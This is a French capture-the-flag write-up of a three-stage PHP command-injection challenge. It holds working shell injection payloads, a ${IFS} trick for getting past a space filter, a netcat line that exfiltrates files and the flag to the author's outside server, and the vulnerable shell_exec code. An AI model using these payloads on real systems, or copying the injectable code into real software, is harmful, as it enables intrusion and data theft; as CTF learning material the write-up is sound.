# DéDéOS

Ce challenge est découpé en 3 parties. Nous accédons à chaque fois à une page similaire où il faudra faire une injection de commandes shell. À chaque étape de nouveaux tests sont effectués pour empêcher les injections.



## DéDéOS 1 - 10 pts

> Serveur de déni de service en masse pour les 1337 h4xorz. Essayer de prouver au propriétaire que c'est de la merde. Lire le fichier  contenant le flag.
>
> http://dedeos-1.interiut.ctf/

La page présente un formulaire où entrer une adresse IP. Nous pouvons supposer que le code PHP (des headers PHP sont envoyés par le serveur) fait un ping de cette IP pour afficher `Cible atteinte` ou `Cible non atteignable` sur la page.

On essaie d'injecter `;ls;` par exemple et nous obtenons carrément la sortie de la commande :

Nous pouvons faire `;ls -lRa;` pour localiser le flag puis `;cat secret/the/flag/is/here/.flag;` pour l'afficher.

On peut également afficher le code PHP :

```php
if(isset($_POST['submit']) && isset($_POST['ip']) && !empty($_POST['ip'])){
    $ip = $_POST['ip'];
    echo "<p>Résultat de l'attaque :</p>";
    echo "<pre>".shell_exec("ping -c 1 $ip > /dev/null && echo 'Cible atteinte' || echo 'Cible non atteignable'")."</pre>";
}
```

(Ce code sera le même au fil des étapes mais des vérifications seront effectuées sur notre entrée.)

## DéDéOS 2 - 20 pts 

> ​    Le propriétaire s'est rendu compte de votre talent, il vous met au défi de nouveau
>
> http://dedeos-2.interiut.ctf/

La page semble identique à la précédente. `;ls;` renvoie une réponse mais `;ls -lRa;` ne passe pas : `Attaque malicieuse détectée`. Il semblerait que les espaces soient interdits. Il suffit alors de les remplacer par `${IFS}` ! En effet, `;ls${IFS}-laR;` nous énumère les fichiers et `;cat${IFS}flag/it/is/soon/here/flag.md;` affiche le flag.

Le code qui nous testait :

```php
if(isset($_POST['submit']) && isset($_POST['ip']) && !empty($_POST['ip'])){
    $ip = $_POST['ip'];
    if(strstr($ip, " ")){
        die("<pre>Attaque malicieuse détectée.</pre>");
    }
    echo "<p>Résultat de l'attaque :</p>";
    echo "<pre>".shell_exec("ping -c 1 $ip > /dev/null && echo 'Cible atteinte' || echo 'Cible non atteignable'")."</pre>";
}
```

## DéDéOS 3 - 50 pts

Cette fois-ci `;ls;` ne passe pas car les `;` sont interdits. Compte tenu de la structure de la commande, je pense qu'il n'y a que 2 solutions : une injection en blind en jouant avec le code de retour (très long et on est pas dans du misc) ou alors exfiltrer des données avec netcat par exemple.

Je lance netcat en écoute sur le port 2020 de mon VPS puis j'injecte `||ls${IFS}-laR|nc${IFS}ribt.fr${IFS}2020`. Je récupère bien la liste des fichiers et `||cat${IFS}.secret/2/1/3/flag.txt|nc${IFS}ribt.fr${IFS}2020` me permet de récupérer le flag.

Le code :

```php
if(isset($_POST['submit']) && isset($_POST['ip']) && !empty($_POST['ip'])){
    $ip = $_POST['ip'];
    if(strstr($ip, " ") || strstr($ip, ";")){
        die("<pre>Attaque malicieuse détectée.</pre>");
    }
    echo "<p>Résultat de l'attaque :</p>";
    echo "<pre>".shell_exec("ping -c 1 $ip > /dev/null && echo 'Cible atteinte' || echo 'Cible non atteignable'")."</pre>";
}
```

Légèrement déçu de ne pas aller plus loin avec des interdictions de lettres par exemple...